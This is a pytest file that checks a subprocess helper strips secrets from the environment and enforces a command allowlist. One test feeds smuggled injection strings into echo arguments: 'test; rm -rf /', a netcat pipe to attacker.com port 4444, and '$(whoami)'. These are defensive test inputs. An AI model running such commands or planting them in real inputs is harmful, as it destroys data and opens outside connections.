"""Subprocess safety tests.

Tests for subprocess helper functions to ensure security.
"""

import os
import subprocess
import pytest
from session_buddy.utils.subprocess_executor import (
    SafeSubprocess,
    _get_safe_environment,
)


def test_get_safe_environment_basic():
    """Test basic environment sanitization."""
    import os

    # Set a test variable
    os.environ["TEST_VAR"] = "value"
    os.environ["SECRET_PASSWORD"] = "secret"

    safe_env = _get_safe_environment()

    # Safe var should remain
    assert "TEST_VAR" in safe_env
    assert safe_env["TEST_VAR"] == "value"

    # Secret should be removed
    assert "SECRET_PASSWORD" not in safe_env

    # Cleanup
    del os.environ["TEST_VAR"]
    del os.environ["SECRET_PASSWORD"]


def test_run_safe_with_sanitization():
    """Test SafeSubprocess.run_safe uses sanitized environment."""
    import os

    # Set sensitive var
    os.environ["TEST_SECRET"] = "should_not_leak"

    # Run command with safe environment
    result = SafeSubprocess.run_safe(["echo", "test"], allowed_commands={"echo"})

    # Command should succeed
    assert result.returncode == 0
    assert "test" in result.stdout

    # Cleanup
    del os.environ["TEST_SECRET"]


def test_popen_safe_with_sanitization():
    """Test SafeSubprocess.popen_safe uses sanitized environment."""
    import os

    # Set sensitive var
    os.environ["TEST_TOKEN"] = "should_not_leak"

    # Open process with safe environment
    proc = SafeSubprocess.popen_safe(["echo", "test"], allowed_commands={"echo"})
    proc.wait()
    assert proc.returncode == 0

    # Cleanup
    del os.environ["TEST_TOKEN"]


def test_run_safe_defaults():
    """Test SafeSubprocess.run_safe enforces safe defaults."""
    import os

    # Test that safe defaults are used
    result = SafeSubprocess.run_safe(["echo", "test"], allowed_commands={"echo"})

    # Should have captured output
    assert hasattr(result, "stdout")
    assert result.stdout is not None

    # Should not have used shell
    # (we can't easily test this, but the function enforces it)


def test_popen_safe_defaults():
    """Test SafeSubprocess.popen_safe enforces safe defaults."""
    # Test that safe defaults are used
    proc = SafeSubprocess.popen_safe(["echo", "test"], allowed_commands={"echo"})
    proc.wait()

    # Should have discarded output (DEVNULL)
    assert proc.stdout is None or proc.stderr is None

    # Should not have used shell
    # (enforced by function)


def test_run_safe_with_error():
    """Test SafeSubprocess.run_safe handles errors gracefully."""
    # Test with command that will fail
    result = SafeSubprocess.run_safe(
        ["ls", "/nonexistent/path/that/does/not/exist"],
        allowed_commands={"ls"}
    )

    # Should not raise exception (check=False)
    assert result.returncode != 0


def test_environment_is_copy():
    """Test that safe environment is a copy, not reference."""
    import os

    os.environ["ORIGINAL"] = "value"

    safe_env = _get_safe_environment()

    # Modify safe environment
    safe_env["NEW_VAR"] = "new_value"

    # Original should be unchanged
    assert "NEW_VAR" not in os.environ

    # Cleanup
    del os.environ["ORIGINAL"]


def test_run_safe_empty_command():
    """Test empty commands are rejected.

    SECURITY: Empty commands can bypass allowlist checks.
    Risk: CRITICAL - empty command validation bypass.
    """
    import pytest

    # Empty list
    with pytest.raises(ValueError, match="Empty command"):
        SafeSubprocess.run_safe([], allowed_commands={"echo"})

    # List with empty string
    with pytest.raises(ValueError, match="Empty command"):
        SafeSubprocess.run_safe([""], allowed_commands={"echo"})


def test_run_safe_argument_injection():
    """Test shell injection in validated command arguments is blocked.

    SECURITY: Arguments can contain injection even if command is safe.
    Risk: CRITICAL - command injection through arguments.

    Attack Vector:
        echo "test; rm -rf /"  # ; can start new command in shell
    """
    # Semicolon injection
    with pytest.raises(ValueError, match="Shell metacharacter"):
        SafeSubprocess.run_safe(
            ["echo", "test; rm -rf /"],
            allowed_commands={"echo"}
        )

    # Pipe injection
    with pytest.raises(ValueError, match="Shell metacharacter"):
        SafeSubprocess.run_safe(
            ["echo", "test | nc attacker.com 4444"],
            allowed_commands={"echo"}
        )

    # Command substitution
    with pytest.raises(ValueError, match="Shell metacharacter"):
        SafeSubprocess.run_safe(
            ["echo", "$(whoami)"],
            allowed_commands={"echo"}
        )


def test_run_safe_absolute_path_blocked():
    """Test absolute path commands are blocked by allowlist.

    SECURITY: Absolute paths can bypass allowlist checks.
    Risk: HIGH - unauthorized command execution.

    Attack Vector:
        User provides: /bin/echo instead of echo
        Allowlist check passes for "echo" but executes /bin/echo
    """
    # Absolute path to allowed command
    with pytest.raises(ValueError, match="Command not allowed"):
        SafeSubprocess.run_safe(
            ["/bin/echo", "test"],
            allowed_commands={"echo"}
        )

    # Relative path with ./
    with pytest.raises(ValueError, match="Command not allowed"):
        SafeSubprocess.run_safe(
            ["./echo", "test"],
            allowed_commands={"echo"}
        )


def test_run_safe_concurrent_sanitization():
    """Test environment sanitization is thread-safe.

    SECURITY: Race conditions in sanitization can leak secrets.
    Risk: HIGH - concurrent access can bypass sanitization.

    Attack Scenario:
        Thread 1: Start sanitizing (remove secrets)
        Thread 2: Add secret to environment
        Thread 1: Finish sanitization (secret remains)
    """
    import threading

    results = []
    errors = []

    def run_command_with_secret():
        """Add secret and run command concurrently."""
        os.environ[f"SECRET_{threading.get_ident()}"] = f"secret_{threading.get_ident()}"

        try:
            result = SafeSubprocess.run_safe(
                ["echo", "test"],
                allowed_commands={"echo"}
            )
            results.append(result)

            # Verify secret not leaked
            assert f"SECRET_{threading.get_ident()}" not in result.stdout

        except Exception as e:
            errors.append(e)
        finally:
            # Cleanup
            if f"SECRET_{threading.get_ident()}" in os.environ:
                del os.environ[f"SECRET_{threading.get_ident()}"]

    # Run 10 concurrent threads
    threads = [threading.Thread(target=run_command_with_secret) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    # Verify all succeeded
    assert len(errors) == 0, f"Errors occurred: {errors}"
    assert len(results) == 10
